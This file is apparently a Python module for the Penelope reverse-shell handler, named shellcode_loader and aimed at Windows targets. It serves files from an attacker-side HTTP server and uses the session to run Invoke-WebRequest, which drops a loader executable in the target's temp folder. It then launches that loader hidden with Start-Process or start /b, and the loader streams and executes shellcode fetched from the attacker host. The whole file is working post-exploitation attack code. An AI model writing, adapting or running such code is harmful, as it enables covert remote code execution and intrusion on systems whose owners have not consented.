import penelope, pathlib, socket, threading, http.server, tempfile, shutil, os

class shellcode_loader(penelope.Module):
    category = "Execution"
    os_filter = "Windows"
    enabled = True
    on_session_start = False
    on_first_attach = False
    on_session_end = False

    LOADER_PATH = str(pathlib.Path(__file__).parent / "binaries" / "loader.exe")

    def run(session, args):
        """Stream shellcode from attacker HTTP server via uwu-loaderStream.exe.

        Usage: run shellcode_loader <path/to/shellcode.bin>
        """
        if not args or not args.strip():
            penelope.logger.error("Usage: run shellcode_loader <path/to/shellcode.bin>")
            return

        sc_path = pathlib.Path(args.strip().strip('"').strip("'"))
        if not sc_path.exists():
            penelope.logger.error(f"Shellcode not found: {sc_path}")
            return

        loader_path = pathlib.Path(shellcode_loader.LOADER_PATH)
        if not loader_path.exists():
            penelope.logger.error(f"Loader not found: {loader_path}")
            return

        if not session.tmp:
            penelope.logger.error("No writable temp dir on target (session.tmp is False)")
            return
        loader_remote = f"{session.tmp}\\loader.exe"

        # -- serve shellcode via HTTP --
        sock = socket.socket()
        sock.bind(('', 0))
        sc_port = sock.getsockname()[1]
        sock.close()

        tmpdir = tempfile.mkdtemp()
        sc_name = sc_path.name
        shutil.copy2(str(sc_path), os.path.join(tmpdir, sc_name))
        shutil.copy2(str(loader_path), os.path.join(tmpdir, "loader.exe"))

        loader_url = f"http://{session._host}:{sc_port}/loader.exe"
        sc_url = f"http://{session._host}:{sc_port}/{sc_name}"

        fetch_event = threading.Event()

        class _Handler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, *a):
                pass
            def do_GET(self):
                super().do_GET()
                if self.path.lstrip('/') == sc_name:
                    fetch_event.set()
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=tmpdir, **kwargs)

        httpd = http.server.HTTPServer(('', sc_port), _Handler)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()

        try:
            # -- download loader via IWR --
            penelope.logger.info("Uploading loader...")
            result = session.exec(
                f'Invoke-WebRequest -Uri "{loader_url}" -OutFile "{loader_remote}" -UseBasicParsing;'
                f'if (Test-Path "{loader_remote}") {{ Write-Output "OK" }}',
                value=True, timeout=30
            )
            if not result or "OK" not in result:
                penelope.logger.error(f"Loader download failed: {(result or '').strip()}")
                return
            penelope.logger.info(f"Loader at {loader_remote}")

            # -- launch --
            penelope.logger.info(f"Executing shellcode from {sc_url}...")
            if session.subtype == 'psh':
                session.exec(
                    f'Start-Process -FilePath "{loader_remote}" '
                    f'-ArgumentList "{sc_url}" -WindowStyle Hidden',
                    value=False
                )
            else:
                session.exec(
                    f'start /b "" "{loader_remote}" "{sc_url}"',
                    force_cmd=True, value=False
                )

            if fetch_event.wait(timeout=30):
                penelope.logger.info("Shellcode fetched, loader executing")
            else:
                penelope.logger.warning("Timeout: loader did not fetch shellcode within 30s")
        finally:
            httpd.shutdown()
            shutil.rmtree(tmpdir, ignore_errors=True)
